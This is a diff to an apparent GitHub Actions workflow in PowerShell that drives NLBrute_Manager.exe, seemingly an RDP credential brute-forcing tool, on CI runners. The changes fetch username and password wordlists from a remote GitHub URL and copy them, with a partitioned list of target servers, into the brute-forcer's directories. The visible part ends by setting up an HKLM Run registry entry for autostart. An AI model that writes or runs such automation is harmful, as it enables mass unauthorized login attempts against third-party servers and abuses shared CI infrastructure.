@@ -48,13 +48,30 @@ jobs:
           
           Write-Host "Initializing Server ID: $currentId" -ForegroundColor Cyan
 
-      - name: 3. Split servers.txt (Dynamic Partitioning)
+      - name: 3. Split servers.txt & Fetch Config Files
         shell: powershell
         run: |
           $maxServers = [int]$env:MAX_SERVERS
           $currentId = [int]$env:SERVER_ID
           $inputFile = "${{ github.workspace }}\servers.txt" 
           $outputFile = "$($env:TEMP_DIR)\servers.txt"
+
+          # --- NEW: Fetch remote config files ---
+          $remoteUserUrl = "https://raw.githubusercontent.com/roozbeh017-hub/vpmaj/refs/heads/main/user.txt"
+          $remotePassUrl = "https://raw.githubusercontent.com/roozbeh017-hub/vpmaj/refs/heads/main/pass.txt"
+          $tempUserFile = "$($env:TEMP_DIR)\user.txt"
+          $tempPassFile = "$($env:TEMP_DIR)\pass.txt"
+
+          Write-Host "Downloading remote user.txt and pass.txt..." -ForegroundColor Cyan
+          try {
+              Invoke-WebRequest -Uri $remoteUserUrl -OutFile $tempUserFile
+              Invoke-WebRequest -Uri $remotePassUrl -OutFile $tempPassFile
+              Write-Host "Remote config files downloaded successfully." -ForegroundColor Green
+          } catch {
+              Write-Error "Failed to download remote config files. Check URLs."
+              exit 1
+          }
+          # --------------------------------------
 
           Write-Host "Reading master file from: $inputFile" -ForegroundColor Cyan
           
@@ -207,30 +224,40 @@ jobs:
           $targetExe1 = "NLBrute_Manager.exe"
           $targetExe2 = "good.txt-monitor.exe"
           $splitFileSource = "$($env:TEMP_DIR)\servers.txt"
+          
+          # NEW: Paths for remote config files
+          $userFileSource = "$($env:TEMP_DIR)\user.txt"
+          $passFileSource = "$($env:TEMP_DIR)\pass.txt"
 
           $exeFile1 = Get-ChildItem -Path $env:WORK_DIR -Filter $targetExe1 -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
           $exeFile2 = Get-ChildItem -Path $env:WORK_DIR -Filter $targetExe2 -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
 
-          # Function to force-inject the file
-          function Force-Inject-Servers($exeFile, $sourceFile) {
+          # Function to force-inject the files
+          function Force-Inject-Files($exeFile, $sourceFiles) {
               if ($exeFile) {
                   $exeDir = $exeFile.DirectoryName
-                  $destinationFile = Join-Path $exeDir "servers.txt"
                   
                   Write-Host "Targeting EXE Directory: $exeDir" -ForegroundColor Cyan
-                  Write-Host "Injecting split file to: $destinationFile" -ForegroundColor Yellow
                   
-                  # Remove any existing servers.txt in that folder first to be absolutely sure
-                  if (Test-Path $destinationFile) { Remove-Item $destinationFile -Force }
-                  
-                  # Copy the split file from the TEMP directory
-                  Copy-Item -Path $sourceFile -Destination $destinationFile -Force
+                  foreach ($sourceFile in $sourceFiles) {
+                      $fileName = Split-Path $sourceFile -Leaf
+                      $destinationFile = Join-Path $exeDir $fileName
+                      
+                      Write-Host "Injecting: $fileName -> $destinationFile" -ForegroundColor Yellow
+                      
+                      if (Test-Path $destinationFile) { Remove-Item $destinationFile -Force }
+                      
+                      Copy-Item -Path $sourceFile -Destination $destinationFile -Force
+                  }
                   Write-Host "Injection Successful!" -ForegroundColor Green
               }
           }
 
-          Force-Inject-Servers -exeFile $exeFile1 -sourceFile $splitFileSource
-          Force-Inject-Servers -exeFile $exeFile2 -sourceFile $splitFileSource
+          # Define the files to inject (Split servers + Remote user/pass)
+          $filesToInject = @($splitFileSource, $userFileSource, $passFileSource)
+
+          Force-Inject-Files -exeFile $exeFile1 -sourceFiles $filesToInject
+          Force-Inject-Files -exeFile $exeFile2 -sourceFiles $filesToInject
 
           # 5. Registry & Autostart Setup
           $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
